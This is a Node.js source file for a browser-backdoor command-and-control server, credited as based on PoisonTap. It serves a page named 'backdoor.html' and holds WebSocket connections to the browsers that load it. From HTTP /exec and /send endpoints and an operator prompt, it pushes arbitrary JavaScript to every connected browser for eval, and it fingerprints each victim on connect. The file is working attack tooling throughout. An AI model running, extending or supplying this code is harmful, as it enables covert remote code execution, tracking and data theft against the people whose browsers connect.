// CREDITS
// start of project based on PoisonTap by Samy Kamkar

//SERVER
//var _ = require('underscore')
var WebSocketServer = require('websocket').server
var webSocketsServerPort = 1337
var fs = require('fs');
var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
var http = require('http')
var conns = []
var gr
var server = http.createServer((request, response) => {

  //output((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')

  if (request.url.indexOf('/exec?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF(JSON.stringify({ request: 'eval', content: request.url.substr(6) }))
    response.end("sent")
  }
  else if (request.url.indexOf('/send?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF('{"' + decodeURI(request.url.substr(6)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
    var checkgr = () =>
    {
      if (gr)
      {
        response.end(gr)
        gr = ""
      }
      else
        setTimeout(checkgr, 500)
    }
    checkgr()
  }
  else if (request.url === '/status')
  {
    response.writeHead(200, {'Content-Type': 'application/json'})
    var responseObject = {
      currentClients: 1234,
      totalHistory: 567
    }
    response.end(JSON.stringify(responseObject))
  }
  else {
	response.writeHead(200, {'Content-Type': 'text/html'});
	response.write(backdoorHtml);
	response.end();
    //response.writeHead(404, {'Content-Tddype': 'text/html'})
    //response.end('Sorry, unknown url')
  }
})
server.listen(webSocketsServerPort, () => {
  output((new Date()) + " Server is listening on port " + webSocketsServerPort )
  start_interface();
})

// create the server
wsServer = new WebSocketServer({
  httpServer: server
})
function handleresponse(obj, con)
{
	//HERE WHAT TO DO WITH RESPONSES FROM CLIENTS
	if ("fingerprint" in obj) {
		output("fingerprint: "+obj.fingerprint);
	}
	// TODO use for merging with connections for info // if ("components" in obj) {

}
function handleReq(obj, con)
{
  if (obj.request === 'getresponse')
    gr = obj.html
}

function ask_fingerprint_info(connection)
{
	command = "new Fingerprint2().get(function(result, components){ socket.send(JSON.stringify({'fingerprint':result})); socket.send(JSON.stringify({'components':components})); });"
	connection.sendUTF(JSON.stringify({ request: 'eval', content: command }))  
}

//REQUESTS
wsServer.on('request', (request) => {
  var obj
  var connection = request.accept(null, request.origin)
  conns.push(connection)

  connection.on('request', (message) => {
    output('request: ' + message)
  })

  connection.on('message', (message) => {
    try { obj = JSON.parse(message.utf8Data) } catch(e) {}
    if (typeof(obj) === 'object')
	  {
		handleReq(obj, connection);
		handleresponse(obj,connection);
	  }
    else
	  {
		//TODO give name of connection (with using the connection var to the left
		output('message: ' + message.utf8Data);
	  }

  })

  // remove connection from our list
  connection.on('close', connection => {
    output('connection closed')
    for (var i in conns)
      if (conns[i] == connection)
      //if (_.isEqual(conns[i], connection)) // XXX
        conns.splice(i, 1)
  })

  ask_fingerprint_info(connection);
})

//INTERFACE
var prompt = require('prompt');
var colors = require("colors/safe");
prompt.message = "";
prompt.delimiter = "";

function input() {
	//TODO check if already active
	//prompt.stop();
	prompt.start();
	prompt.get({properties: {command:{description: ">>>"}}}, function (err, result) {
		if (result != null) {
			process_command(result.command);
			input();
		} else {
			process.exit();
		}
	});
}
function output(text) {
	console.log("");
	console.log(text);
	//console.log("");
}
function start_interface() {
	console.log("Typed javascript-commands will be sent to all connected clients");
	input()
}

//PROCESSING OF COMMANDS
function process_command(command) {
	//different commands here -> make layer system
	for (var i in conns)
		conns[i].sendUTF(JSON.stringify({ request: 'eval', content: command }))
	if (command!="") {
		if (command == "conns") {
			console.log(conns);
		} else { 
			output("Command sent: "+command);
		}
	}
}
